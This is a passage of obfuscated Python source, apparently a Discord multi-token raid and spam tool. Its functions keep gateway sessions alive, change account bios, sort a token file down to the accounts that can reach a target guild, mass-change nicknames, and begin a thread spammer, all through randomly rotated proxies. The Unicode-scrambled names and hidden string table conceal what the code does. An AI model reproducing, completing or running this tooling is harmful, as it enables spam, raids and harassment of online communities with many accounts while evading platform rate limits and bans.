𝗠𝘔𝘕𝘐𝙈𝗜𝗠𝙄𝙡𝗠𝙉𝘕𝗠𝙉𝗹𝘔𝙈𝙡𝘔𝘐𝗹𝙄𝙉𝙄𝘕𝗡𝙄𝗠𝘕𝗡𝘐𝗹[278]: {𝗠𝘔𝗡𝙄𝘔𝗜𝙈𝗜𝙡𝙈𝗡𝙉𝗠𝗡𝙡𝗠𝙈𝗹𝗠𝘐𝘭𝘐𝘕𝙄𝗡𝙉𝗜𝘔𝗡𝘕𝙄𝘭[295]: {}, 𝘔𝘔𝘕𝘐𝘔𝘐𝗠𝗜𝙡𝘔𝘕𝗡𝙈𝗡𝙡𝗠𝗠𝙡𝘔𝙄𝘭𝘐𝗡𝘐𝙉𝘕𝗜𝘔𝙉𝙉𝗜𝗹[296]: 𝙈𝘔𝗡𝙄𝗠𝙄𝘔𝙄𝗹𝘔𝙉𝗡𝘔𝗡𝙡𝙈𝗠𝗹𝙈𝗜𝗹𝙄𝘕𝘐𝙉𝗡𝘐𝗠𝘕𝗡𝘐𝘭[231], 𝗠𝙈𝙉𝙄𝘔𝗜𝘔𝗜𝙡𝗠𝘕𝙉𝘔𝘕𝘭𝙈𝙈𝗹𝙈𝗜𝘭𝘐𝘕𝗜𝗡𝗡𝙄𝙈𝗡𝘕𝙄𝗹[297]: 0, 𝙈𝘔𝙉𝗜𝗠𝘐𝗠𝙄𝗹𝘔𝗡𝙉𝘔𝗡𝘭𝘔𝙈𝗹𝗠𝗜𝗹𝘐𝘕𝘐𝙉𝗡𝙄𝙈𝙉𝙉𝗜𝗹[298]: -1}}}
    𝘸𝘀.send(𝗷𝘀𝙤𝘯.dumps(𝘢𝘂𝙩𝘩))
    while True:
        𝗵𝘦𝙖𝙧𝘁𝘣𝗲𝙖𝘵𝘑𝙎𝗢𝘕 = {𝘔𝘔𝗡𝘐𝘔𝗜𝘔𝘐𝗹𝗠𝗡𝘕𝙈𝙉𝗹𝘔𝗠𝗹𝘔𝘐𝘭𝙄𝗡𝙄𝙉𝙉𝗜𝙈𝗡𝘕𝙄𝗹[169]: 1, 𝙈𝘔𝘕𝘐𝘔𝙄𝗠𝘐𝙡𝙈𝙉𝘕𝙈𝘕𝘭𝘔𝘔𝙡𝘔𝙄𝙡𝘐𝘕𝘐𝘕𝙉𝗜𝗠𝙉𝘕𝗜𝗹[253]: 𝘁𝙤𝘬𝘦𝙣, 𝙈𝘔𝙉𝗜𝙈𝗜𝘔𝗜𝙡𝘔𝙉𝘕𝙈𝗡𝘭𝗠𝗠𝘭𝙈𝙄𝙡𝗜𝗡𝘐𝗡𝙉𝗜𝗠𝘕𝙉𝙄𝘭[166]: 𝗠𝙈𝗡𝗜𝘔𝗜𝗠𝙄𝗹𝗠𝙉𝙉𝘔𝘕𝗹𝘔𝗠𝙡𝘔𝘐𝗹𝗜𝘕𝙄𝗡𝘕𝘐𝗠𝘕𝗡𝗜𝘭[290]}
        𝙬𝘀.send(𝘫𝙨𝘰𝗻.dumps(𝗵𝙚𝘢𝗿𝘁𝙗𝙚𝗮𝘵𝘑𝘚𝙊𝙉))
        𝘴𝙡𝘦𝘦𝗽(𝗵𝗲𝙖𝘳𝘁𝘣𝙚𝘢𝘁_𝘪𝗻𝘵𝙚𝗿𝙫𝗮𝗹)

def bio_changer(token, bio):
    𝗵𝗲𝙖𝙙𝘦𝗿𝘀 = 𝗛𝘦𝗮𝗱𝙚𝘳𝙨(𝘵𝗼𝗸𝗲𝙣)
    𝘱𝘢𝘆𝗹𝙤𝘢𝘥 = {𝙈𝘔𝘕𝗜𝙈𝗜𝗠𝙄𝘭𝗠𝘕𝘕𝗠𝗡𝗹𝙈𝗠𝙡𝙈𝘐𝘭𝗜𝗡𝗜𝘕𝘕𝘐𝘔𝙉𝙉𝙄𝗹[299]: 𝙗𝗶𝙤}
    𝗱𝙣 = 𝘵𝙤𝘬𝗲𝘯.split(𝙈𝙈𝘕𝘐𝘔𝘐𝙈𝙄𝙡𝙈𝗡𝘕𝗠𝘕𝘭𝗠𝙈𝗹𝙈𝘐𝗹𝗜𝘕𝘐𝙉𝘕𝙄𝙈𝗡𝙉𝗜𝙡[247])
    𝘯𝘯 = 𝙙𝘯[0]
    if 𝙥𝘳𝘰𝘅𝘆:
        𝘳𝗿 = 𝘳𝗲𝗾𝙪𝗲𝘴𝘵𝘴.patch(𝙈𝗠𝙉𝙄𝙈𝙄𝗠𝙄𝗹𝗠𝗡𝗡𝗠𝘕𝘭𝘔𝗠𝙡𝗠𝘐𝗹𝘐𝘕𝗜𝗡𝘕𝘐𝗠𝙉𝙉𝗜𝘭[300], headers=𝘩𝙚𝘢𝗱𝙚𝙧𝘴, json=𝘱𝙖𝙮𝙡𝘰𝗮𝗱, proxy={𝘔𝗠𝘕𝗜𝗠𝙄𝙈𝘐𝘭𝘔𝘕𝙉𝗠𝗡𝙡𝘔𝙈𝘭𝗠𝘐𝙡𝙄𝘕𝘐𝙉𝘕𝗜𝙈𝙉𝗡𝙄𝙡[244]: 𝙈𝘔𝘕𝗜𝗠𝘐𝙈𝗜𝙡𝙈𝗡𝘕𝘔𝗡𝘭𝙈𝘔𝙡𝘔𝙄𝗹𝙄𝙉𝙄𝗡𝙉𝘐𝙈𝗡𝗡𝘐𝙡[246] + 𝙧𝘢𝗻𝙙𝙤𝙢.choice(𝘱𝘳𝘰𝘹𝙞𝗲𝘴), 𝙈𝗠𝘕𝘐𝘔𝘐𝗠𝙄𝘭𝘔𝗡𝙉𝗠𝙉𝗹𝗠𝙈𝘭𝗠𝘐𝘭𝙄𝗡𝘐𝗡𝘕𝗜𝙈𝙉𝘕𝗜𝙡[245]: 𝘔𝘔𝙉𝗜𝘔𝗜𝗠𝗜𝙡𝙈𝗡𝗡𝗠𝘕𝘭𝗠𝗠𝙡𝙈𝗜𝙡𝘐𝘕𝗜𝘕𝗡𝗜𝘔𝘕𝙉𝗜𝘭[246] + 𝙧𝗮𝙣𝗱𝘰𝘮.choice(𝗽𝙧𝘰𝙭𝗶𝙚𝘀)})
    else:
        𝗿𝘳 = 𝗿𝙚𝗾𝙪𝙚𝘀𝘁𝘴.patch(𝙈𝙈𝘕𝗜𝘔𝙄𝗠𝘐𝗹𝘔𝙉𝘕𝙈𝙉𝙡𝙈𝗠𝗹𝙈𝗜𝗹𝘐𝗡𝗜𝗡𝗡𝙄𝘔𝗡𝗡𝗜𝙡[300], headers=𝗵𝘦𝘢𝘥𝗲𝙧𝙨, json=𝗽𝘢𝘺𝗹𝙤𝘢𝗱)
    if 𝘳𝗿.status_code == 200:
        𝗽𝘳𝗶𝙣𝘵(f"{𝙧}{𝙈𝘔𝙉𝘐𝙈𝘐𝘔𝘐𝙡𝗠𝙉𝙉𝗠𝗡𝗹𝙈𝘔𝙡𝙈𝗜𝘭𝘐𝙉𝙄𝘕𝙉𝗜𝘔𝙉𝗡𝘐𝘭[91]}{𝘥𝘢𝙩𝙚𝘁𝗶𝗺𝗲.datetime.now().strftime(f'{𝙜}{𝗠𝗠𝗡𝗜𝙈𝙄𝘔𝙄𝗹𝙈𝗡𝘕𝘔𝘕𝙡𝘔𝙈𝙡𝙈𝘐𝘭𝘐𝘕𝙄𝘕𝗡𝘐𝙈𝘕𝗡𝙄𝘭[92]}{𝙧}')}{𝗠𝙈𝘕𝙄𝗠𝘐𝙈𝙄𝙡𝘔𝗡𝘕𝘔𝗡𝘭𝘔𝗠𝘭𝗠𝘐𝗹𝙄𝗡𝗜𝙉𝗡𝗜𝘔𝘕𝘕𝗜𝗹[93]}{𝗿}{𝘔𝘔𝙉𝗜𝗠𝙄𝗠𝙄𝙡𝙈𝙉𝗡𝗠𝙉𝘭𝙈𝗠𝘭𝗠𝘐𝗹𝘐𝘕𝗜𝗡𝙉𝘐𝙈𝘕𝘕𝙄𝗹[91]}{𝙡𝗰}{𝙈𝘔𝙉𝙄𝗠𝗜𝙈𝗜𝙡𝗠𝗡𝙉𝘔𝘕𝗹𝗠𝘔𝙡𝙈𝗜𝙡𝗜𝘕𝙄𝗡𝘕𝗜𝘔𝙉𝗡𝗜𝘭[301]}{𝘳}{𝙈𝗠𝘕𝘐𝗠𝙄𝙈𝙄𝗹𝗠𝙉𝗡𝗠𝙉𝘭𝗠𝘔𝘭𝙈𝘐𝗹𝗜𝗡𝙄𝗡𝘕𝗜𝘔𝗡𝘕𝗜𝗹[93]}{𝘯𝘯}{𝙜}{𝘔𝗠𝙉𝗜𝘔𝘐𝗠𝙄𝗹𝗠𝙉𝘕𝙈𝘕𝙡𝙈𝗠𝘭𝘔𝘐𝙡𝙄𝘕𝘐𝗡𝘕𝙄𝙈𝘕𝙉𝗜𝗹[249]}")
    else:
        𝗽𝗿𝘪𝘯𝙩(f"{𝗿}{𝘔𝗠𝙉𝙄𝘔𝗜𝗠𝗜𝗹𝗠𝗡𝗡𝘔𝘕𝗹𝘔𝙈𝘭𝙈𝘐𝙡𝗜𝙉𝗜𝘕𝗡𝙄𝘔𝙉𝙉𝙄𝗹[91]}{𝙙𝘢𝘁𝘦𝘵𝙞𝘮𝗲.datetime.now().strftime(f'{𝗴}{𝗠𝗠𝘕𝘐𝗠𝗜𝗠𝙄𝗹𝙈𝗡𝗡𝙈𝗡𝘭𝗠𝗠𝗹𝗠𝙄𝙡𝗜𝙉𝗜𝗡𝗡𝙄𝗠𝗡𝗡𝙄𝙡[92]}{𝗿}')}{𝙈𝘔𝘕𝙄𝗠𝙄𝘔𝙄𝗹𝘔𝙉𝘕𝙈𝗡𝗹𝗠𝘔𝙡𝗠𝘐𝘭𝗜𝘕𝘐𝙉𝘕𝙄𝙈𝘕𝗡𝘐𝘭[93]}{𝘳}{𝙈𝘔𝗡𝗜𝗠𝗜𝗠𝙄𝘭𝘔𝙉𝗡𝘔𝘕𝙡𝗠𝙈𝗹𝙈𝘐𝗹𝙄𝗡𝙄𝗡𝘕𝗜𝙈𝗡𝘕𝗜𝗹[91]}{𝗯}{𝘔𝙈𝘕𝗜𝙈𝗜𝗠𝘐𝙡𝙈𝘕𝗡𝘔𝙉𝘭𝗠𝙈𝘭𝗠𝙄𝗹𝗜𝙉𝘐𝙉𝗡𝙄𝘔𝙉𝘕𝗜𝗹[269]}{𝘳}{𝘔𝘔𝘕𝗜𝗠𝙄𝘔𝙄𝗹𝙈𝙉𝙉𝗠𝘕𝙡𝙈𝙈𝘭𝘔𝙄𝙡𝙄𝙉𝘐𝙉𝗡𝙄𝙈𝙉𝘕𝙄𝙡[93]}{𝘯𝙣}{𝗴}{𝙈𝗠𝗡𝘐𝘔𝘐𝙈𝘐𝗹𝗠𝙉𝙉𝗠𝘕𝗹𝙈𝗠𝙡𝗠𝘐𝙡𝘐𝘕𝘐𝙉𝘕𝙄𝙈𝘕𝘕𝘐𝘭[270]}{𝗿𝗿.text}")

def check_guild(token, guildid):
    try:
        𝙝𝙚𝗮𝙙𝙚𝙧𝘴 = {𝙈𝙈𝗡𝗜𝘔𝗜𝙈𝙄𝘭𝗠𝘕𝘕𝗠𝘕𝘭𝘔𝗠𝘭𝘔𝙄𝙡𝘐𝘕𝘐𝗡𝘕𝙄𝙈𝙉𝙉𝗜𝙡[130]: 𝙩𝗼𝙠𝗲𝗻}
        if 𝗽𝙧𝙤𝙭𝘆:
            𝘳𝘦𝘀𝙥𝘰𝗻𝙨𝙚 = 𝘳𝘦𝙦𝘶𝘦𝙨𝘵𝘀.get(f'{𝘔𝘔𝙉𝙄𝗠𝗜𝗠𝙄𝙡𝘔𝙉𝗡𝘔𝙉𝗹𝙈𝙈𝗹𝘔𝙄𝙡𝗜𝙉𝗜𝙉𝙉𝘐𝗠𝘕𝙉𝘐𝗹[152]}{𝘨𝘂𝙞𝘭𝘥𝙞𝗱}', headers=𝘩𝙚𝗮𝗱𝘦𝗿𝘴, proxy={𝗠𝙈𝗡𝘐𝘔𝘐𝗠𝙄𝗹𝘔𝙉𝘕𝙈𝙉𝗹𝙈𝙈𝘭𝙈𝘐𝘭𝙄𝗡𝘐𝘕𝗡𝗜𝗠𝘕𝘕𝙄𝙡[244]: 𝙈𝙈𝘕𝘐𝘔𝙄𝗠𝙄𝙡𝘔𝘕𝙉𝗠𝘕𝗹𝗠𝗠𝗹𝙈𝙄𝙡𝘐𝙉𝗜𝘕𝘕𝙄𝘔𝘕𝘕𝙄𝘭[246] + 𝗿𝘢𝘯𝙙𝗼𝗺.choice(𝗽𝘳𝘰𝘹𝙞𝗲𝙨), 𝗠𝗠𝙉𝗜𝙈𝗜𝗠𝘐𝘭𝘔𝗡𝗡𝙈𝘕𝗹𝗠𝘔𝙡𝗠𝘐𝘭𝗜𝗡𝙄𝙉𝘕𝘐𝗠𝙉𝙉𝘐𝙡[245]: 𝘔𝙈𝙉𝙄𝗠𝗜𝘔𝘐𝙡𝙈𝘕𝘕𝘔𝙉𝙡𝘔𝙈𝗹𝘔𝙄𝘭𝙄𝙉𝗜𝙉𝙉𝗜𝗠𝗡𝙉𝗜𝗹[246] + 𝘳𝗮𝗻𝗱𝙤𝘮.choice(𝙥𝗿𝘰𝘅𝘪𝗲𝙨)})
        else:
            𝙧𝙚𝘀𝙥𝗼𝙣𝘴𝗲 = 𝘳𝙚𝗾𝘶𝗲𝘀𝘵𝘀.get(f'{𝙈𝙈𝘕𝘐𝙈𝗜𝗠𝗜𝘭𝙈𝘕𝗡𝗠𝗡𝙡𝘔𝘔𝙡𝗠𝘐𝙡𝗜𝙉𝗜𝗡𝘕𝗜𝘔𝗡𝗡𝙄𝘭[152]}{𝗴𝘶𝙞𝘭𝗱𝘪𝙙}', headers=𝙝𝗲𝙖𝙙𝙚𝙧𝙨)
        𝘥𝙣 = 𝘵𝙤𝙠𝘦𝗻.split(𝘔𝙈𝘕𝘐𝗠𝙄𝘔𝗜𝘭𝗠𝙉𝙉𝙈𝙉𝘭𝙈𝘔𝘭𝘔𝗜𝙡𝗜𝘕𝙄𝘕𝗡𝗜𝗠𝘕𝘕𝘐𝘭[247])
        𝗻𝘯 = 𝙙𝙣[0]
        if 𝙧𝘦𝙨𝘱𝗼𝘯𝘴𝗲.status_code == 200:
            𝗽𝘳𝙞𝙣𝙩(f"{𝙧}{𝗠𝙈𝙉𝘐𝙈𝗜𝘔𝙄𝙡𝙈𝗡𝗡𝙈𝙉𝗹𝙈𝗠𝙡𝙈𝘐𝙡𝙄𝗡𝗜𝙉𝗡𝗜𝗠𝙉𝘕𝙄𝘭[91]}{𝘥𝙖𝘵𝘦𝘵𝗶𝙢𝘦.datetime.now().strftime(f'{𝗴}{𝘔𝗠𝙉𝗜𝗠𝙄𝗠𝘐𝗹𝘔𝘕𝘕𝙈𝘕𝘭𝗠𝘔𝗹𝙈𝙄𝙡𝗜𝙉𝙄𝗡𝙉𝘐𝙈𝗡𝗡𝗜𝙡[92]}{𝗿}')}{𝗠𝘔𝗡𝘐𝙈𝗜𝙈𝙄𝘭𝙈𝗡𝗡𝙈𝘕𝘭𝗠𝘔𝗹𝘔𝗜𝗹𝙄𝗡𝗜𝘕𝘕𝙄𝘔𝘕𝗡𝘐𝙡[93]}{𝗿}{𝘔𝘔𝙉𝙄𝘔𝙄𝘔𝘐𝘭𝗠𝙉𝘕𝙈𝗡𝙡𝘔𝘔𝙡𝙈𝗜𝗹𝙄𝙉𝙄𝗡𝘕𝘐𝙈𝙉𝗡𝘐𝗹[91]}{𝘭𝙘}{𝙈𝗠𝗡𝗜𝙈𝘐𝗠𝘐𝘭𝗠𝗡𝙉𝗠𝙉𝗹𝙈𝗠𝙡𝗠𝙄𝙡𝙄𝘕𝗜𝘕𝙉𝘐𝙈𝗡𝗡𝙄𝗹[301]}{𝘳}{𝙈𝘔𝗡𝘐𝗠𝙄𝙈𝙄𝙡𝘔𝘕𝗡𝙈𝘕𝙡𝗠𝙈𝘭𝙈𝘐𝙡𝗜𝗡𝙄𝘕𝙉𝗜𝙈𝗡𝘕𝗜𝘭[93]}{𝗻𝘯}{𝘨}{𝗠𝗠𝘕𝙄𝘔𝘐𝘔𝙄𝘭𝘔𝗡𝘕𝘔𝘕𝗹𝗠𝘔𝘭𝙈𝘐𝙡𝙄𝘕𝘐𝗡𝙉𝘐𝗠𝙉𝙉𝙄𝘭[249]}")
            return True
        else:
            𝗽𝘳𝘪𝗻𝘵(f"{𝘳}{𝙈𝘔𝗡𝗜𝙈𝙄𝘔𝘐𝘭𝙈𝙉𝗡𝗠𝘕𝗹𝗠𝘔𝗹𝙈𝗜𝙡𝙄𝘕𝙄𝘕𝙉𝘐𝙈𝗡𝘕𝙄𝙡[91]}{𝙙𝙖𝘁𝗲𝘵𝘪𝗺𝗲.datetime.now().strftime(f'{𝘨}{𝙈𝘔𝘕𝙄𝙈𝗜𝗠𝙄𝘭𝙈𝙉𝙉𝘔𝗡𝗹𝘔𝙈𝙡𝘔𝘐𝘭𝘐𝘕𝙄𝘕𝘕𝘐𝙈𝙉𝙉𝗜𝙡[92]}{𝘳}')}{𝙈𝙈𝘕𝘐𝙈𝙄𝗠𝗜𝙡𝙈𝘕𝗡𝘔𝙉𝙡𝗠𝙈𝘭𝗠𝙄𝙡𝗜𝗡𝙄𝘕𝘕𝘐𝙈𝗡𝘕𝘐𝘭[93]}{𝗿}{𝘔𝘔𝙉𝙄𝙈𝘐𝘔𝙄𝗹𝙈𝗡𝗡𝙈𝘕𝘭𝙈𝘔𝘭𝙈𝘐𝙡𝘐𝙉𝙄𝘕𝙉𝘐𝙈𝗡𝙉𝘐𝙡[91]}{𝙗}{𝗠𝘔𝗡𝘐𝗠𝘐𝙈𝘐𝗹𝘔𝗡𝗡𝙈𝗡𝙡𝗠𝘔𝘭𝙈𝗜𝙡𝘐𝘕𝗜𝙉𝙉𝗜𝗠𝗡𝘕𝘐𝘭[302]}{𝙧}{𝗠𝙈𝘕𝘐𝘔𝙄𝘔𝙄𝗹𝘔𝙉𝙉𝗠𝙉𝙡𝗠𝘔𝙡𝗠𝗜𝘭𝘐𝙉𝗜𝗡𝘕𝘐𝙈𝘕𝘕𝙄𝙡[93]}{𝙣𝘯}{𝙜}{𝗠𝙈𝗡𝘐𝗠𝙄𝘔𝘐𝙡𝙈𝘕𝗡𝙈𝘕𝗹𝘔𝘔𝙡𝗠𝙄𝙡𝙄𝙉𝘐𝘕𝗡𝘐𝙈𝘕𝙉𝙄𝙡[249]}")
            return False
    except:
        pass

def save_tokens_guild(file_path, guildid):
    𝙫𝘢𝗹𝗶𝗱_𝙩𝗼𝗸𝗲𝗻𝙨 = 0
    𝘁𝘰𝘬𝘦𝗻𝙨_𝘷𝘢𝘭𝗶𝗱 = []
    𝘁𝗼𝙠𝙚𝘯𝘴 = 𝗼𝗽𝘦𝘯(𝗳𝘪𝙡𝙚_𝙥𝗮𝙩𝘩, 𝘔𝗠𝗡𝘐𝙈𝗜𝗠𝗜𝘭𝗠𝗡𝙉𝘔𝘕𝘭𝙈𝙈𝙡𝙈𝙄𝘭𝙄𝗡𝗜𝗡𝘕𝙄𝗠𝗡𝘕𝙄𝗹[30]).read().splitlines()
    for 𝘁𝗼𝘬𝗲𝘯 in 𝘵𝘰𝙠𝘦𝘯𝘀:
        if 𝗰𝗵𝙚𝘤𝙠_𝗴𝙪𝘪𝙡𝙙(𝘵𝘰𝙠𝘦𝙣, 𝗴𝘶𝗶𝙡𝗱𝘪𝙙):
            𝙫𝘢𝙡𝙞𝙙_𝙩𝘰𝗸𝗲𝗻𝙨 += 1
            𝘵𝘰𝙠𝘦𝘯𝘴_𝘃𝙖𝙡𝗶𝘥.append(𝘵𝙤𝘬𝘦𝗻)
    with 𝙤𝙥𝙚𝙣(𝙛𝙞𝘭𝘦_𝙥𝗮𝙩𝙝, 𝙈𝘔𝙉𝘐𝗠𝗜𝙈𝗜𝘭𝘔𝗡𝘕𝘔𝗡𝙡𝗠𝗠𝗹𝙈𝙄𝙡𝙄𝘕𝘐𝗡𝗡𝘐𝘔𝙉𝘕𝗜𝙡[213]) as 𝗳:
        𝘧.truncate(0)
    with 𝗼𝙥𝙚𝗻(𝘧𝘪𝙡𝘦_𝗽𝗮𝙩𝘩, 𝘔𝙈𝘕𝘐𝙈𝙄𝘔𝗜𝗹𝘔𝘕𝗡𝘔𝙉𝘭𝙈𝗠𝘭𝘔𝘐𝙡𝗜𝙉𝘐𝙉𝗡𝙄𝘔𝘕𝘕𝗜𝘭[215]) as 𝗳:
        for 𝙩𝗼𝗸𝗲𝗻 in 𝘵𝘰𝗸𝘦𝗻𝘀_𝘷𝙖𝘭𝘪𝙙:
            𝘧.write(𝘁𝗼𝘬𝗲𝗻 + 𝗠𝘔𝗡𝗜𝗠𝘐𝘔𝘐𝗹𝘔𝙉𝙉𝘔𝘕𝗹𝗠𝙈𝗹𝗠𝘐𝙡𝗜𝗡𝙄𝙉𝗡𝘐𝘔𝘕𝙉𝘐𝘭[63])

def mass_nick(token, guild, nick):
    𝙝𝘦𝗮𝘥𝘦𝗿𝙨 = 𝗛𝙚𝗮𝗱𝗲𝙧𝘀(𝘵𝘰𝗸𝙚𝙣)
    𝙥𝙖𝘺𝘭𝗼𝙖𝘥 = {𝗠𝙈𝘕𝗜𝙈𝘐𝙈𝗜𝗹𝘔𝘕𝙉𝙈𝗡𝙡𝙈𝘔𝘭𝘔𝘐𝘭𝘐𝘕𝗜𝘕𝘕𝗜𝙈𝘕𝘕𝘐𝘭[303]: 𝙣𝙞𝗰𝗸}
    𝙙𝗻 = 𝙩𝘰𝘬𝘦𝙣.split(𝙈𝘔𝗡𝗜𝙈𝗜𝗠𝗜𝙡𝘔𝘕𝙉𝘔𝙉𝗹𝗠𝗠𝗹𝘔𝗜𝙡𝙄𝘕𝘐𝙉𝙉𝘐𝘔𝘕𝘕𝙄𝘭[247])
    𝗻𝗻 = 𝗱𝙣[0]
    if 𝗽𝘳𝗼𝙭𝙮:
        𝗿𝘳 = 𝘳𝙚𝙦𝘂𝘦𝘀𝙩𝙨.patch(f'{𝘔𝘔𝙉𝙄𝙈𝗜𝘔𝙄𝙡𝙈𝙉𝙉𝙈𝙉𝙡𝘔𝙈𝙡𝘔𝘐𝘭𝘐𝘕𝙄𝙉𝘕𝙄𝙈𝗡𝗡𝗜𝘭[152]}{𝙜𝙪𝙞𝗹𝘥}{𝙈𝘔𝙉𝘐𝗠𝘐𝘔𝗜𝘭𝘔𝙉𝙉𝘔𝗡𝗹𝙈𝗠𝘭𝘔𝗜𝘭𝙄𝗡𝙄𝘕𝗡𝘐𝗠𝘕𝙉𝘐𝙡[304]}', json=𝙥𝙖𝘺𝗹𝘰𝘢𝘥, headers=𝗵𝘦𝗮𝙙𝙚𝙧𝘴, proxy={𝙈𝙈𝙉𝘐𝗠𝗜𝘔𝘐𝙡𝗠𝘕𝗡𝙈𝙉𝙡𝘔𝙈𝘭𝗠𝙄𝙡𝘐𝙉𝗜𝗡𝙉𝙄𝙈𝙉𝙉𝙄𝗹[244]: 𝘔𝗠𝙉𝘐𝗠𝗜𝘔𝘐𝗹𝗠𝗡𝘕𝙈𝗡𝘭𝗠𝙈𝘭𝙈𝙄𝗹𝗜𝗡𝙄𝘕𝘕𝘐𝙈𝘕𝙉𝗜𝙡[246] + 𝗿𝗮𝗻𝗱𝘰𝗺.choice(𝗽𝘳𝗼𝘅𝗶𝘦𝙨), 𝘔𝘔𝙉𝙄𝙈𝙄𝘔𝗜𝘭𝘔𝙉𝘕𝙈𝘕𝗹𝘔𝘔𝙡𝙈𝗜𝘭𝙄𝘕𝘐𝗡𝗡𝙄𝙈𝙉𝙉𝙄𝘭[245]: 𝘔𝙈𝗡𝙄𝘔𝙄𝗠𝗜𝘭𝙈𝙉𝙉𝙈𝘕𝘭𝗠𝗠𝘭𝘔𝙄𝘭𝙄𝙉𝗜𝗡𝘕𝙄𝘔𝗡𝘕𝘐𝙡[246] + 𝗿𝗮𝙣𝘥𝙤𝘮.choice(𝙥𝙧𝗼𝙭𝗶𝙚𝘴)})
    else:
        𝘳𝙧 = 𝘳𝗲𝘲𝙪𝙚𝘀𝘵𝘴.patch(f'{𝘔𝘔𝗡𝗜𝘔𝗜𝗠𝗜𝘭𝙈𝘕𝘕𝘔𝙉𝗹𝘔𝙈𝗹𝘔𝗜𝙡𝘐𝙉𝙄𝙉𝘕𝙄𝘔𝗡𝙉𝗜𝗹[152]}{𝘨𝙪𝗶𝗹𝘥}{𝘔𝗠𝙉𝘐𝙈𝘐𝙈𝙄𝗹𝙈𝙉𝙉𝘔𝙉𝙡𝗠𝗠𝗹𝗠𝙄𝙡𝘐𝗡𝘐𝙉𝙉𝗜𝗠𝘕𝘕𝙄𝗹[304]}', json=𝗽𝙖𝘺𝘭𝙤𝘢𝗱, headers=𝗵𝗲𝘢𝙙𝙚𝙧𝘴)
    if 𝘳𝘳.status_code == 200:
        𝗽𝗿𝙞𝙣𝘵(f"{𝙧}{𝘔𝗠𝘕𝗜𝙈𝗜𝗠𝘐𝘭𝙈𝘕𝘕𝗠𝘕𝙡𝗠𝙈𝙡𝘔𝙄𝗹𝙄𝙉𝙄𝘕𝗡𝘐𝗠𝗡𝙉𝘐𝘭[91]}{𝗱𝗮𝙩𝗲𝙩𝗶𝗺𝙚.datetime.now().strftime(f'{𝗴}{𝗠𝗠𝗡𝙄𝘔𝗜𝗠𝗜𝙡𝗠𝘕𝘕𝙈𝘕𝘭𝗠𝗠𝗹𝘔𝙄𝘭𝗜𝗡𝘐𝗡𝘕𝘐𝘔𝙉𝗡𝗜𝙡[92]}{𝙧}')}{𝙈𝙈𝘕𝙄𝗠𝙄𝙈𝗜𝙡𝗠𝘕𝙉𝘔𝗡𝗹𝗠𝘔𝙡𝗠𝘐𝘭𝗜𝘕𝙄𝘕𝗡𝘐𝙈𝘕𝘕𝘐𝙡[93]}{𝗿}{𝗠𝘔𝘕𝗜𝘔𝘐𝙈𝙄𝘭𝘔𝙉𝗡𝗠𝗡𝙡𝗠𝙈𝗹𝗠𝗜𝙡𝘐𝘕𝘐𝗡𝘕𝘐𝗠𝙉𝘕𝘐𝗹[91]}{𝙡𝙘}{𝘔𝘔𝘕𝗜𝗠𝙄𝙈𝙄𝘭𝘔𝘕𝗡𝘔𝘕𝙡𝗠𝘔𝗹𝙈𝗜𝘭𝙄𝗡𝗜𝘕𝙉𝘐𝗠𝗡𝘕𝗜𝘭[301]}{𝘳}{𝙈𝘔𝙉𝗜𝗠𝗜𝙈𝗜𝘭𝘔𝘕𝘕𝙈𝗡𝙡𝙈𝗠𝗹𝙈𝗜𝗹𝘐𝘕𝘐𝗡𝘕𝙄𝘔𝙉𝗡𝗜𝘭[93]}{𝘯𝘯}{𝙜}{𝘔𝙈𝘕𝘐𝘔𝗜𝘔𝗜𝙡𝙈𝗡𝙉𝗠𝙉𝙡𝗠𝗠𝙡𝘔𝙄𝘭𝘐𝗡𝘐𝘕𝗡𝘐𝗠𝗡𝙉𝙄𝘭[249]}")
    else:
        𝘱𝗿𝗶𝙣𝘵(f"{𝗿}{𝘔𝘔𝗡𝗜𝗠𝙄𝘔𝗜𝘭𝘔𝙉𝘕𝘔𝘕𝗹𝙈𝙈𝙡𝘔𝗜𝗹𝘐𝗡𝗜𝗡𝗡𝙄𝘔𝘕𝗡𝗜𝙡[91]}{𝘥𝘢𝙩𝙚𝘵𝙞𝗺𝗲.datetime.now().strftime(f'{𝙜}{𝘔𝘔𝙉𝗜𝙈𝗜𝘔𝗜𝙡𝗠𝘕𝙉𝘔𝗡𝘭𝙈𝙈𝙡𝘔𝙄𝘭𝙄𝙉𝗜𝘕𝗡𝗜𝘔𝘕𝙉𝙄𝘭[92]}{𝗿}')}{𝘔𝙈𝙉𝗜𝘔𝗜𝘔𝗜𝘭𝙈𝙉𝙉𝘔𝗡𝗹𝘔𝗠𝗹𝙈𝙄𝗹𝘐𝗡𝙄𝙉𝘕𝘐𝙈𝙉𝙉𝗜𝘭[93]}{𝙧}{𝗠𝘔𝗡𝗜𝙈𝗜𝘔𝗜𝙡𝙈𝘕𝗡𝙈𝘕𝗹𝙈𝘔𝙡𝘔𝙄𝗹𝘐𝙉𝙄𝙉𝘕𝘐𝗠𝙉𝙉𝘐𝗹[91]}{𝙗}{𝙈𝘔𝗡𝙄𝘔𝗜𝙈𝗜𝘭𝙈𝗡𝗡𝗠𝙉𝘭𝙈𝘔𝙡𝗠𝘐𝗹𝙄𝘕𝘐𝗡𝙉𝙄𝘔𝗡𝗡𝙄𝗹[269]}{𝙧}{𝙈𝙈𝗡𝗜𝗠𝗜𝘔𝗜𝗹𝘔𝙉𝙉𝗠𝘕𝗹𝙈𝗠𝘭𝗠𝙄𝘭𝘐𝙉𝙄𝗡𝗡𝘐𝙈𝙉𝗡𝘐𝘭[93]}{𝙣𝗻}{𝗴}{𝘔𝘔𝗡𝗜𝗠𝘐𝙈𝙄𝘭𝙈𝘕𝘕𝘔𝙉𝗹𝘔𝗠𝘭𝘔𝘐𝙡𝙄𝙉𝗜𝙉𝘕𝘐𝗠𝗡𝙉𝙄𝘭[270]}{𝘳𝘳.text}")

def thread_spammer(token, name, channel):
    𝙝𝙚𝙖𝘥𝗲𝗿𝙨 = 𝙃𝗲𝘢𝗱𝘦𝗿𝙨(𝙩𝘰𝙠𝗲𝘯)
